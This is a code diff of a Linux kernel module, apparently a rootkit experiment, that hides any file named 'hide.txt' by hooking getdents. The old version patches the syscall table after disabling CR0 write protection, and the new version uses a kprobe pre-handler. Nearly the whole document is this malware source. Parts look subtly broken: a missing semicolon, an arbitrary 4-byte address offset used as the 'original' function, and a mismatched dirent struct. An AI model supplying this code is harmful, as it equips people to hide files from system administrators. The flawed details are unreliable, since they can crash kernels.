@@ -1,74 +1,114 @@
 // SPDX-License-Identifier: GPL-2.0-only
 /*
+ * https://github.com/torvalds/linux/blob/master/samples/kprobes/kprobe_example.c
  * https://x86sec.com/posts/2020/03/08/linux-kernel-rootkit/
  */
+
+#define pr_fmt(fmt) "%s: " fmt, __func__
+
 #include "./include/files_hook.h"
 
 #include <linux/kernel.h>
-#include <linux/module.h>
 #include <linux/kprobes.h>
+#include <linux/module.h>
 
-unsigned long *custom_kallsyms_lookup(void)
+struct kprobe kp = {
+    .symbol_name = "__x64_sys_getdents64",
+};
+
+/* The pointer to store the original getdents function */
+getdents_t original_getdents;
+
+/* Pre-handler for kprobe */
+int pre_handler(struct kprobe *p, struct pt_regs *regs)
 {
-	register_kprobe(&kp);
-	unsigned long *table = (unsigned long *)kp.addr;
-	unregister_kprobe(&kp);
-	return table;
+    // Dereference pt_regs to access syscall arguments
+    unsigned int fd = (unsigned int)regs->di;
+    struct linux_dirent *dirp = (struct linux_dirent *)regs->si;
+    unsigned int count = (unsigned int)regs->dx;
+
+    // Call your custom hook_getdents function
+    regs->ax = hook_getdents(fd, dirp, count);
+
+    // Return 1 to indicate that the hook handled the syscall
+    return 1;
 }
 
 /* https://www.man7.org/linux/man-pages/man2/getdents.2.html */
+/* Custom implementation of getdents */
 asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
-  int ret;
-  struct linux_dirent* cur = dirp;
-  int pos = 0;
-  extern unsigned char *table
-  getdents = (void*)table[__NR_getdents];
+    int ret;
+    struct linux_dirent *cur = dirp;
+    int pos = 0;
 
-  // Call original getdents
-  ret = getdents(fd, dirp, count);
-  while (pos < ret)
-  {
+    // Call original getdents to populate dirp
+    ret = original_getdents(fd, dirp, count);
+    if (ret <= 0)
+        return ret;
 
-    if (is_prefix(cur->d_name, "hide.txt"))
-    {
-      // Remove hidden file from list
-      int reclen = cur->d_reclen;
-      char* next_rec = (char*)cur + reclen;
-      int len = (int)dirp + ret - (int)next_rec;
-      memmove(cur, next_rec, len);
-      ret -= reclen;
-      continue;
+    // Iterate through each directory entry
+    while (pos < ret) {
+        if (strncmp(cur->d_name, "hide.txt", strlen("hide.txt")) == 0) {
+            int reclen = cur->d_reclen;
+            char *next_rec = (char *)cur + reclen;
+            int len = ret - pos - reclen;  // Correct the length calculation
+
+            memmove(cur, next_rec, len);  // Shift the entries up
+            ret -= reclen;  // Adjust the return value
+            continue;
+        }
+
+        pos += cur->d_reclen;  // Move to the next entry
+        cur = (struct linux_dirent *)((char *)dirp + pos);
     }
-    pos += cur->d_reclen;
-    cur = (struct linux_dirent*) ((char*)dirp + pos);
-  }
-  return ret;
+
+    return ret;
 }
 
-static int __init files_hook_init(unsigned long table)
+static int __init files_hook_init(void)
 {
- 	/* https://stackoverflow.com/questions/63661249/what-does-write-cr0read-cr0-0x10000-do
-	Enable write access */
-	write_cr0(read_cr0() & (~ 0x10000));
-	getdents = (void*)table[__NR_getdents];
-	//getdents64 = (void*)table[__NR_getdents64];
+    int ret;
 
-	table[__NR_getdents] = (unsigned long) hook_getdents;
-	//table[__NR_getdents64] = (unsigned long) hook_getdents64;
-	/* Restore write protection */
-	write_cr0(read_cr0() | 0x10000);
+    /* Register the kprobe */
+    ret = register_kprobe(&kp);
+    if (ret < 0) {
+        pr_err("Failed to register kprobe, returned %d\n", ret);
+        return ret;
+    }
 
-	return 0;
+    /* Ensure the symbol is correctly resolved */
+    if (!kp.addr) {
+        pr_err("Failed to resolve address for __x64_sys_getdents64\n");
+        unregister_kprobe(&kp);
+        return -EFAULT;
+    }
+
+    pr_info("Apply offset for kprobe address\n");
+    /* Automatically adjust the kprobe address */
+    kp.addr = (void *)((unsigned long)kp.addr - 0x4); // Adjust by 4 bytes for instruction size
+
+    /* Store the original getdents function pointer */
+    pr_info("__x64_sys_getdents64: %px\n", kp.addr);
+    original_getdents = (getdents_t)kp.addr;
+
+    return 0;
 }
 
 static void __exit files_hook_exit(void)
 {
+    pr_info("Reversing offset for kprobe address\n");
+    /* Reverse the offset tweak before unregistering */
+    kp.addr = (void *)((unsigned long)kp.addr + 0x4);
+
+    pr_info("Unregistering kprobe for __x64_sys_getdents64\n");
+    unregister_kprobe(&kp);
     pr_info("files_hook exit successfully\n");
+
 }
 
-module_init(files_hook_init)
-module_exit(files_hook_exit)
+module_init(files_hook_init);
+module_exit(files_hook_exit);
 MODULE_AUTHOR("MikeHorn-git");
-MODULE_DESCRIPTION("files_hook");
+MODULE_DESCRIPTION("Kprobe getdents hooking");
 MODULE_LICENSE("GPL");
